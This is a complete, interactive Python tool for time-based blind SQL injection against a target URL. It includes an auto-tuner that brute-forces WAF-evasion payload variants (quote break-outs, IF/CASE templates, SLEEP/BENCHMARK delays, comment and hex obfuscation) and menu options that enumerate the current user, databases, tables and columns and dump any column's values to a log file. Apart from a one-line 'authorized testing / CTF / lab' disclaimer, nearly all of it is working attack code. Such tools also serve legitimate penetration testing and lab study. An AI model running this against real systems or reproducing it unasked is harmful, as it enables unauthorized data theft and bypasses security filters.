#!/usr/bin/env python3
"""
Time-Based Blind SQLi Extractor (WAF-bypass edition)
----------------------------------------------------
Pure time-based (SLEEP) blind SQL injection. Every question we ask the DB is
answered ONLY by how long the response takes:

    condition TRUE  -> DB sleeps -> response is SLOW
    condition FALSE -> no sleep  -> response is FAST

On top of the robust timing engine (baseline calibration, adaptive threshold,
multi-sample voting, binary search) this edition adds a WAF-evasion layer.
Because obfuscation can easily break the SQL, the whole point of the AUTO-TUNER
is to try many combinations against the live target and lock in the first one
that STILL WORKS (i.e. actually produces the delay):

  WAF bypass building blocks
  --------------------------
  * break-out prefixes      : 1'   1   1"   1')   1")   1`
  * conditional templates   : IF()  |  CASE WHEN  |  AND-chain (short-circuit)
  * delay functions         : SLEEP()  |  BENCHMARK()
  * comment terminators     : "-- -"  |  "#"
  * tampers (obfuscation)   : space2comment (space -> /**/)
                              randomcase    (SeLeCt)
                              versioned      (/*!SELECT*/)
                              quotes2hex     ('dvwa' -> 0x64767761)

The auto-tuner picks the FIRST combo whose TRUE test is slow and FALSE test is
fast, then measures the real baseline/true timings for that combo.

For authorized security testing / CTF / lab use only.
"""

import requests
import time
import sys
import os
import re
import random
import statistics
from datetime import datetime
from urllib.parse import quote

# Silence the "InsecureRequestWarning" from verify=False, since we intentionally
# skip cert checks against lab targets.
try:
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
except Exception:
    pass

# result.txt lives next to this script regardless of the current directory
LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "result.txt")


def log_result(label, value):
    """Append a timestamped result line to result.txt next to the script."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {label}: {value}\n"
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(line)


# ---------------- Configuration ----------------
DELAY = 5                 # SLEEP() duration (seconds) used as the TRUE signal
REQUEST_TIMEOUT = DELAY + 10
MAX_STRING_LEN = 100
ASCII_MIN, ASCII_MAX = 32, 126   # printable range for binary search
MAX_SAMPLES = 5           # re-asks allowed on a borderline (noisy) answer

# BENCHMARK iteration count used when SLEEP is blocked. Tune up on fast servers.
BENCH_COUNT = 5000000

# Probe conditions used for calibration / auto-tuning. These deliberately
# contain the SAME heavy keywords (SELECT / FROM / information_schema) that real
# extraction uses, so the auto-tuner only accepts a payload combo that survives
# a keyword-filtering WAF. Using bare 1=1 / 1=2 here was the bug that made the
# tuner lock in a combo that passed sanity but failed every real query.
PROBE_TRUE = "(SELECT COUNT(*) FROM information_schema.tables)>0"       # -> slow
PROBE_FALSE = "(SELECT COUNT(*) FROM information_schema.tables)>999999"  # -> fast

# SQL keywords the tampers may rewrite (case / versioned comments).
KEYWORDS = [
    "INFORMATION_SCHEMA", "TABLE_SCHEMA", "TABLE_NAME", "COLUMN_NAME",
    "DATABASE", "BENCHMARK", "VERSION", "COLUMNS", "TABLES", "SELECT",
    "LENGTH", "SUBSTR", "COUNT", "LIMIT", "SLEEP", "WHERE", "ASCII",
    "WHEN", "CASE", "THEN", "ELSE", "FROM", "USER", "SHA1", "RAND",
    "AND", "END", "MID", "ORD", "MD5", "IF", "OR",
]
_KW_RE = re.compile(r"\b(" + "|".join(sorted(KEYWORDS, key=len, reverse=True)) + r")\b",
                    re.IGNORECASE)


class TimeBlindSQLi:
    def __init__(self, base_url, param="id"):
        self.base_url = base_url
        self.param = param
        self.session = requests.Session()
        self.last_db = None
        self.last_table = None

        # ---- WAF-bypass / payload configuration (defaults; auto-tuner overrides) ----
        self.prefix = "1'"                              # break-out sequence
        self.template = "{prefix} AND IF(({cond}),{delay},0)"  # conditional wrapper
        self.template_name = "IF"                       # human-readable template name
        self.comment = "-- -"                           # trailing comment
        self.delay_kind = "sleep"                       # 'sleep' or 'benchmark'
        self.tampers = set()                            # obfuscation transforms

        # ---- learned timing model ----
        self.baseline = 0.0        # normal (FALSE) response time
        self.true_time = DELAY     # observed TRUE response time
        self.threshold = DELAY * 0.6
        self.clear_gap = DELAY * 0.4

    # ---------------- payload construction ----------------

    def _lit(self, s):
        """Render a string literal, hex-encoding it if quotes2hex is enabled
        (0x... needs no quotes, which dodges a lot of naive WAF rules)."""
        if "quotes2hex" in self.tampers:
            return "0x" + s.encode("utf-8").hex()
        return "'" + s.replace("'", "''") + "'"

    def _delay_expr(self):
        if self.delay_kind == "benchmark":
            return f"BENCHMARK({BENCH_COUNT},SHA1(RAND()))"
        return f"SLEEP({DELAY})"

    def _apply_tampers(self, body):
        """Apply obfuscation transforms to the SQL body (NOT the comment)."""
        if "randomcase" in self.tampers:
            body = _KW_RE.sub(
                lambda m: "".join(random.choice([c.lower(), c.upper()]) for c in m.group(0)),
                body,
            )
        if "versioned" in self.tampers:
            body = _KW_RE.sub(lambda m: f"/*!{m.group(0)}*/", body)
        if "space2comment" in self.tampers:
            body = body.replace(" ", "/**/")
        return body

    def _build_payload(self, cond):
        body = self.template.format(prefix=self.prefix, cond=cond, delay=self._delay_expr())
        body = self._apply_tampers(body)
        # Comment appended verbatim so we never corrupt the "-- " token's space.
        return body + self.comment

    def config_summary(self):
        t = ", ".join(sorted(self.tampers)) or "none"
        return (f"prefix={self.prefix!r} template={self.template_name} "
                f"delay={self.delay_kind} comment={self.comment!r} tampers=[{t}]")

    def example_payload(self):
        return self._build_payload("1=1")

    # ---------------- low level request ----------------

    def _time_request(self, cond):
        """Send one request for `cond`, return elapsed seconds."""
        payload = self._build_payload(cond)
        sep = "&" if "?" in self.base_url else "?"
        full_url = f"{self.base_url}{sep}{self.param}={quote(payload)}"
        try:
            start = time.time()
            self.session.get(full_url, timeout=REQUEST_TIMEOUT, verify=False)
            return time.time() - start
        except requests.exceptions.Timeout:
            return self.true_time      # treat as TRUE (delay fired)
        except requests.RequestException:
            return self.baseline       # treat as FALSE

    def _is_true(self, elapsed):
        return elapsed >= self.threshold

    def _send(self, cond):
        """Ask one boolean question with multi-sample voting on close calls."""
        elapsed = self._time_request(cond)
        if abs(elapsed - self.threshold) >= self.clear_gap:
            return self._is_true(elapsed)

        votes = [self._is_true(elapsed)]
        while len(votes) < MAX_SAMPLES:
            votes.append(self._is_true(self._time_request(cond)))
            true_count = sum(votes)
            false_count = len(votes) - true_count
            remaining = MAX_SAMPLES - len(votes)
            if true_count > false_count + remaining:
                return True
            if false_count > true_count + remaining:
                return False
        return sum(votes) > len(votes) / 2

    # ---------------- calibration & auto-tuning ----------------

    def _measure_split(self):
        """Measure FALSE and TRUE timings for the current config using the
        keyword-heavy probes, and update the timing model.
        Returns (false_time, true_time)."""
        false_samples = [self._time_request(PROBE_FALSE) for _ in range(3)]
        true_samples = [self._time_request(PROBE_TRUE) for _ in range(2)]
        f = statistics.median(false_samples)
        t = statistics.median(true_samples)
        self.baseline = f
        self.true_time = t
        self.threshold = f + (t - f) * 0.5
        self.clear_gap = max((t - f) * 0.4, 0.15)
        return f, t

    def calibrate(self):
        """Re-measure timing for the currently locked payload config."""
        print("[*] Calibrating timing for current payload config...")
        f, t = self._measure_split()
        print(f"    FALSE ~= {f:.2f}s, TRUE ~= {t:.2f}s, threshold = {self.threshold:.2f}s")
        if t - f < DELAY * 0.5:
            print("    [!] Weak separation between TRUE/FALSE. Consider re-running "
                  "auto-tune or increasing DELAY/BENCH_COUNT.")

    # candidate building blocks tried by the auto-tuner (most-likely first)
    _PREFIXES = ["1'", "1", "1\"", "1')", "1\")", "1`"]
    _TEMPLATES = [
        ("IF", "{prefix} AND IF(({cond}),{delay},0)"),
        ("CASE", "{prefix} AND (SELECT CASE WHEN(({cond})) THEN {delay} ELSE 0 END)"),
        ("ANDchain", "{prefix} AND ({cond}) AND {delay}"),
        ("ORif", "{prefix} OR IF(({cond}),{delay},0)"),
    ]
    _COMMENTS = ["-- -", "#"]
    _DELAYS = ["sleep", "benchmark"]
    _PROFILES = [
        ("plain", set()),
        ("space2comment", {"space2comment"}),
        ("case+comment", {"space2comment", "randomcase"}),
        ("versioned+case+comment", {"space2comment", "randomcase", "versioned"}),
        ("hex+case+comment", {"space2comment", "randomcase", "quotes2hex"}),
    ]

    def _quick_true(self, cond):
        """One-shot timing for auto-tune scoring (no voting)."""
        return self._time_request(cond)

    def autotune(self):
        """Brute-force payload building blocks against the live target and lock
        in the first combo that clearly separates TRUE (slow) from FALSE (fast)."""
        print("\n[*] Auto-tuning WAF bypass. This tries many payload variants;")
        print("    non-working ones return fast, so it's usually quick. Ctrl-C to stop.\n")

        tried = 0
        for pname, tampers in self._PROFILES:
            for dkind in self._DELAYS:
                for prefix in self._PREFIXES:
                    for tname, template in self._TEMPLATES:
                        for comment in self._COMMENTS:
                            self.tampers = set(tampers)
                            self.delay_kind = dkind
                            self.prefix = prefix
                            self.template = template
                            self.template_name = tname
                            self.comment = comment
                            tried += 1

                            # FALSE test first (cheap; should be fast). Uses the
                            # keyword-heavy probe so a WAF that blocks SELECT/FROM
                            # makes this combo fail here rather than pass sanity
                            # and then break every real extraction query.
                            f = self._quick_true(PROBE_FALSE)
                            if f >= (DELAY * 0.5):
                                # Even FALSE is slow -> junk/error page, skip.
                                continue
                            # TRUE test (should be slow if this combo works).
                            t = self._quick_true(PROBE_TRUE)
                            gap = t - f
                            need = (DELAY * 0.5) if dkind == "sleep" else max(f, 0.5)
                            if gap >= need and t >= need:
                                sys.stdout.write("\r" + " " * 70 + "\r")
                                print(f"[+] WORKING payload found after {tried} tries "
                                      f"(profile={pname}, delay={dkind}, template={tname}).")
                                # Lock in and measure a proper timing model.
                                self._measure_split()
                                print("    " + self.config_summary())
                                print(f"    example: {self.example_payload()}")
                                print(f"    baseline={self.baseline:.2f}s "
                                      f"true={self.true_time:.2f}s "
                                      f"threshold={self.threshold:.2f}s")
                                # Functional confirmation: a real scalar query
                                # (user()) must actually respond TRUE/FALSE.
                                ok_hi = self._send("LENGTH((user()))>0")
                                ok_lo = self._send("LENGTH((user()))>9999")
                                if ok_hi and not ok_lo:
                                    print("    [+] Extraction confirmed working "
                                          "(user() length probe passed).\n")
                                    return True
                                print("    [!] Timing works but real extraction "
                                      "probe failed here; continuing search...\n")
                                continue
                            sys.stdout.write(f"\r[*] tried {tried} variants "
                                             f"(last: {pname}/{dkind}/{tname})   ")
                            sys.stdout.flush()

        sys.stdout.write("\r" + " " * 70 + "\r")
        print(f"[-] Auto-tune exhausted {tried} variants without a clear hit.")
        print("    Target may not be time-injectable here, WAF is blocking all of")
        print("    these, or DELAY is too small for a slow target. Try raising DELAY.")
        return False

    def sanity_check(self):
        """Auto-tune to find a working (bypass) payload; fall back to a manual
        differential check with the default payload."""
        if self.autotune():
            return True
        print("[*] Falling back to default payload sanity check...")
        f, t = self._measure_split()
        ok = (t - f) >= DELAY * 0.5
        print(f"    FALSE ~= {f:.2f}s, TRUE ~= {t:.2f}s -> "
              f"{'OK' if ok else 'NO clear delay'}")
        return ok

    # ---------------- extraction ----------------

    def get_length(self, expression, max_len=MAX_STRING_LEN):
        lo, hi = 0, max_len
        while lo < hi:
            mid = (lo + hi) // 2
            if self._send(f"LENGTH(({expression}))>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def get_char(self, expression, position):
        lo, hi = ASCII_MIN, ASCII_MAX
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTR(({expression}),{position},1))>{mid}"
            if self._send(cond):
                lo = mid + 1
            else:
                hi = mid
        return chr(lo)

    def _verify_char(self, expression, position, code):
        return self._send(f"ASCII(SUBSTR(({expression}),{position},1))={code}")

    def extract(self, expression, label=""):
        length = self.get_length(expression)
        if length == 0:
            print(f"[{label}] (empty or no result)")
            log_result(label, "(empty or no result)")
            return ""
        print(f"[*] '{label}' length = {length}")
        result = ""
        for pos in range(1, length + 1):
            c = self.get_char(expression, pos)
            if not self._verify_char(expression, pos, ord(c)):
                c = self.get_char(expression, pos)
            result += c
            sys.stdout.write(f"\r[{label}] {result}")
            sys.stdout.flush()
        print()
        log_result(label, result)
        return result

    # -------- high level helpers (use _lit for WAF-safe literals) --------

    def user(self):
        # Scalar functions don't need SELECT; dropping it avoids the SELECT filter.
        return self.extract("user()", label="user()")

    def database(self):
        result = self.extract("database()", label="database()")
        if result:
            self.last_db = result
        return result

    def version(self):
        return self.extract("version()", label="version()")

    def table_count(self, db):
        expr = (f"SELECT COUNT(*) FROM information_schema.tables "
                f"WHERE table_schema={self._lit(db)}")
        return self.extract(expr, label="table_count")

    def table_name(self, db, i):
        expr = (f"SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema={self._lit(db)} LIMIT {i},1")
        result = self.extract(expr, label=f"table[{i}]")
        if result:
            self.last_table = result
        return result

    def column_count(self, db, table):
        expr = (f"SELECT COUNT(*) FROM information_schema.columns "
                f"WHERE table_schema={self._lit(db)} AND table_name={self._lit(table)}")
        return self.extract(expr, label="col_count")

    def column_name(self, db, table, i):
        expr = (f"SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema={self._lit(db)} AND table_name={self._lit(table)} "
                f"LIMIT {i},1")
        return self.extract(expr, label=f"col[{i}]")

    def row_count(self, table):
        expr = f"SELECT COUNT(*) FROM {table}"
        return self.extract(expr, label="row_count")

    def cell(self, table, column, i):
        expr = f"SELECT {column} FROM {table} LIMIT {i},1"
        return self.extract(expr, label=f"{table}.{column}[{i}]")


def full_auto(sqli):
    """user() -> database() -> tables -> columns for each table, then summary."""
    summary = {}

    print("\n[*] Step 1/4: current user()...")
    summary["user"] = sqli.user()

    print("\n[*] Step 2/4: current database()...")
    db = sqli.database()
    summary["database"] = db

    if not db:
        print("[!] Could not determine database name. Stopping auto enumeration.")
        return

    print(f"\n[*] Step 3/4: tables in '{db}'...")
    try:
        n_tables = int(sqli.table_count(db))
    except ValueError:
        print("[!] Could not parse table count. Stopping.")
        return

    tables = []
    for i in range(n_tables):
        t = sqli.table_name(db, i)
        if t:
            tables.append(t)
    summary["tables"] = tables

    print(f"\n[*] Step 4/4: columns for each table...")
    summary["columns"] = {}
    for table in tables:
        try:
            n_cols = int(sqli.column_count(db, table))
        except ValueError:
            print(f"[!] Could not parse column count for '{table}', skipping.")
            continue
        cols = []
        for i in range(n_cols):
            c = sqli.column_name(db, table, i)
            if c:
                cols.append(c)
        summary["columns"][table] = cols

    print("\n" + "=" * 50)
    print("FULL ENUMERATION SUMMARY")
    print("=" * 50)
    print(f"user()      : {summary['user']}")
    print(f"database()  : {summary['database']}")
    print(f"tables ({len(tables)}):")
    for t in tables:
        cols = summary["columns"].get(t, [])
        print(f"  - {t}  [{', '.join(cols) if cols else 'no columns found'}]")
    print("=" * 50)

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write(f"\n[{timestamp}] ===== FULL ENUMERATION SUMMARY =====\n")
        f.write(f"user(): {summary['user']}\n")
        f.write(f"database(): {summary['database']}\n")
        for t in tables:
            cols = summary["columns"].get(t, [])
            f.write(f"table: {t} | columns: {', '.join(cols) if cols else '(none found)'}\n")
        f.write("=" * 50 + "\n")

    print(f"\n[+] Full summary saved to {LOG_PATH}")


def configure_waf(sqli):
    """Manually pick payload building blocks (in case auto-tune misses)."""
    print("\n--- Manual WAF bypass config ---")
    print("Current:", sqli.config_summary())

    print("\nPrefixes:")
    for i, p in enumerate(sqli._PREFIXES):
        print(f"  {i}) {p}")
    c = input(f"prefix index [keep {sqli.prefix!r}]: ").strip()
    if c.isdigit() and int(c) < len(sqli._PREFIXES):
        sqli.prefix = sqli._PREFIXES[int(c)]

    print("\nTemplates:")
    for i, (name, tpl) in enumerate(sqli._TEMPLATES):
        print(f"  {i}) {name}: {tpl}")
    c = input("template index [keep current]: ").strip()
    if c.isdigit() and int(c) < len(sqli._TEMPLATES):
        sqli.template_name = sqli._TEMPLATES[int(c)][0]
        sqli.template = sqli._TEMPLATES[int(c)][1]

    print("\nDelay function: 1) sleep  2) benchmark")
    c = input(f"choice [keep {sqli.delay_kind}]: ").strip()
    if c == "1":
        sqli.delay_kind = "sleep"
    elif c == "2":
        sqli.delay_kind = "benchmark"

    print("\nComments:")
    for i, cm in enumerate(sqli._COMMENTS):
        print(f"  {i}) {cm!r}")
    c = input("comment index [keep current]: ").strip()
    if c.isdigit() and int(c) < len(sqli._COMMENTS):
        sqli.comment = sqli._COMMENTS[int(c)]

    all_tampers = ["space2comment", "randomcase", "versioned", "quotes2hex"]
    print("\nTampers (comma-separated indices, empty = none):")
    for i, tp in enumerate(all_tampers):
        print(f"  {i}) {tp}")
    c = input("tamper indices: ").strip()
    if c:
        chosen = set()
        for part in c.split(","):
            part = part.strip()
            if part.isdigit() and int(part) < len(all_tampers):
                chosen.add(all_tampers[int(part)])
        sqli.tampers = chosen
    elif c == "":
        pass

    print("\nNew config:", sqli.config_summary())
    print("example payload:", sqli.example_payload())
    sqli.calibrate()


def menu(sqli):
    while True:
        print("\n--- Menu ---")
        print("1) Current user()")
        print("2) Current database()")
        print("3) DB version()")
        print("4) List tables in a database")
        print("5) List columns in a table")
        print("6) Dump values from a column")
        print("7) Custom scalar expression")
        print("8) Full auto enumeration (user + db + tables + columns)")
        print("9) Re-calibrate timing")
        print("a) Auto-tune WAF bypass (find a working payload)")
        print("w) Configure WAF bypass manually")
        print("s) Show current payload config")
        print("0) Exit")
        choice = input("> ").strip().lower()

        if choice == "1":
            print("\nRESULT:", sqli.user())
        elif choice == "2":
            print("\nRESULT:", sqli.database())
        elif choice == "3":
            print("\nRESULT:", sqli.version())
        elif choice == "4":
            default = sqli.last_db or ""
            prompt = f"Database name [{default}]: " if default else "Database name: "
            db = input(prompt).strip() or default
            if not db:
                print("[!] No database name available.")
                continue
            try:
                n = int(sqli.table_count(db))
            except ValueError:
                print("[!] Could not parse table count.")
                continue
            print(f"\n[*] {n} tables found:")
            for i in range(n):
                sqli.table_name(db, i)
        elif choice == "5":
            default_db = sqli.last_db or ""
            prompt_db = f"Database name [{default_db}]: " if default_db else "Database name: "
            db = input(prompt_db).strip() or default_db
            default_table = sqli.last_table or ""
            prompt_table = f"Table name [{default_table}]: " if default_table else "Table name: "
            table = input(prompt_table).strip() or default_table
            if not db or not table:
                print("[!] Missing database or table name.")
                continue
            try:
                n = int(sqli.column_count(db, table))
            except ValueError:
                print("[!] Could not parse column count.")
                continue
            print(f"\n[*] {n} columns found:")
            for i in range(n):
                sqli.column_name(db, table, i)
        elif choice == "6":
            table = input("Table name: ").strip()
            column = input("Column name: ").strip()
            try:
                n = int(sqli.row_count(table))
            except ValueError:
                print("[!] Could not parse row count.")
                continue
            print(f"\n[*] {n} rows found:")
            for i in range(n):
                sqli.cell(table, column, i)
        elif choice == "7":
            expr = input("SQL scalar expression: ").strip()
            print("\nRESULT:", sqli.extract(expr, label="custom"))
        elif choice == "8":
            full_auto(sqli)
        elif choice == "9":
            sqli.calibrate()
        elif choice == "a":
            sqli.autotune()
        elif choice == "w":
            configure_waf(sqli)
        elif choice == "s":
            print("\n" + sqli.config_summary())
            print("example payload:", sqli.example_payload())
        elif choice == "0":
            break
        else:
            print("Invalid choice")


def main():
    print("=== Time-Based Blind SQLi Extractor (WAF-bypass edition) ===\n")
    url = input("Target URL (e.g. https://host/index.php?id=1): ").strip()
    param = input("Injectable parameter name [default: id]: ").strip() or "id"

    sqli = TimeBlindSQLi(url, param=param)

    if not sqli.sanity_check():
        proceed = input("No working payload locked in. Continue anyway? (y/n): ").strip().lower()
        if proceed != "y":
            return

    menu(sqli)


if __name__ == "__main__":
    main()
